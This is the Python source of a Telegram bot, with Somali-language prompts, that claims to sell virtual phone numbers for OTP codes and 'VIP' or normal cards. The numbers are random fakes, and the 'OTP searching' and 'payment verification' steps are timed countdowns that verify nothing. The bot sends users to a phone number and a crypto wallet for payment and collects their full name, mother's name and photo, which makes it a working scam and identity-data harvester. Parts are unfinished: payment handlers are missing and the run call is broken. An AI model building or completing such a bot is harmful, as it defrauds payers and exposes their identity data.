import os
import random
import asyncio
import logging
from aiogram.filters import Command
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.bot import DefaultBotProperties

# ---------------- CONFIG ----------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="Markdown"))
dp = Dispatcher(storage=MemoryStorage())

logging.basicConfig(level=logging.INFO)

users = {}
pending_admin = {}

# ---------------- STATES ----------------
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ---------------- HELPERS ----------------
def normal_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec,0,-1):
        await msg.edit_text(f"{text}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text("Processing...")

# ---------------- START ----------------
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order"),
                   KeyboardButton(text="Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ---------------- NEW ORDER ----------------
@dp.message(F.text=="New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ---------------- VIRTUAL ----------------
@dp.callback_query(F.data=="virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton(text="Google", callback_data="v_Google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: CallbackQuery):
    number = normal_number()
    code = generate_code()
    users[call.from_user.id] = {"type":"virtual","number":number,"code":code}

    msg = await call.message.edit_text("OTP Searching...")
    await countdown(msg,"OTP Searching",5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local"),
         InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])
    await msg.edit_text(f"Number: {number}\nDir Lacagta si aad u hesho OTP.", reply_markup=kb)

# ---------------- VIRTUAL PAYMENT ----------------
@dp.callback_query(F.data=="v_local")
async def v_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm_pay"),
         InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text("+252907868526", reply_markup=kb)

@dp.callback_query(F.data=="v_crypto")
async def v_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="BNB - Copy", callback_data="copy_bnb")],
        [InlineKeyboardButton(text="USDT-BEP20 - Copy", callback_data="copy_usdt")],
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm_pay"),
         InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])
    text = (
        "Send Crypto:\n\n"
        "BNB: `0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n"
        "USDT-BEP20: `0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo Copy si aad nuqul u hesho."
    )
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data=="v_confirm_pay")
async def v_confirm_pay(call: CallbackQuery):
    msg = await call.message.edit_text("Payment Verification...")
    await countdown(msg,"Payment Verification",10)
    if pending_admin.get(call.from_user.id) is None:
        await call.message.answer("PLEASE SEND MONEY 💵")
    else:
        await call.message.answer("Codsigaaga waa la diray Admin ka")
        # Admin notification
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="APPROVE", callback_data=f"approve_{call.from_user.id}")],
            [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{call.from_user.id}")]
        ])
        await bot.send_message(ADMIN_ID,
            f"User {call.from_user.id} virtual request\nNumber: {users[call.from_user.id]['number']}",
            reply_markup=kb
        )

# ---------------- CARD ----------------
@dp.callback_query(F.data=="card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data=="vip" else normal_number()
    users[call.from_user.id] = {"type":"card","level":call.data,"number":number}
    await call.message.answer("Geli Magaca Saddexan:")
    await state.set_state(CardState.full_name)

@dp.message(CardState.full_name)
async def name(msg: Message,state: FSMContext):
    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def mother(msg: Message,state: FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirkaaga:")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def photo(msg: Message,state: FSMContext):
    users[msg.from_user.id]["photo"] = msg.photo[-1].file_id
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL",callback_data="c_pay_local"),
         InlineKeyboardButton(text="CRYPTO",callback_data="c_pay_crypto")]
    ])
    await msg.answer("Dooro Payment Method:", reply_markup=kb)

# ---------------- RUN BOT ----------------
async def main():
    await dp.start_polling()

if __name__=="__main__":
    asyncio.run(main())
